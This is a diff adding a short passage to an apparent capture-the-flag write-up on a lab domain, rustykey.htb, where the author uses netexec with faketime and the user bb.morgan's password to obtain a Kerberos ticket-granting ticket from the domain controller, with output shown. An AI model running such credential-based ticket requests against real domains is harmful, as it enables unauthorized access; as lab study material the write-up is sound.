@@ -302,6 +302,18 @@ However the other two users still show errors, `gg.anderson` is failing becuause
 
 `ee.reed` is more interesting since this user has not been granted logon rights, but i also cannot add them 
 
+So at this point it looks like i can only compromise `bb.morgan` out of these users
+
+```python
+❯❯❯ faketime -f +8h nxc smb dc.rustykey.htb -u 'bb.morgan' -p 'Password123!' -k --generate-tgt bb.morgan  
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\bb.morgan:Password123! 
+SMB         dc.rustykey.htb 445    dc               [+] TGT saved to: bb.morgan.ccache
+SMB         dc.rustykey.htb 445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=bb.morgan.ccache
+```
+
+I can get a TGT for this user
+
 
 
 
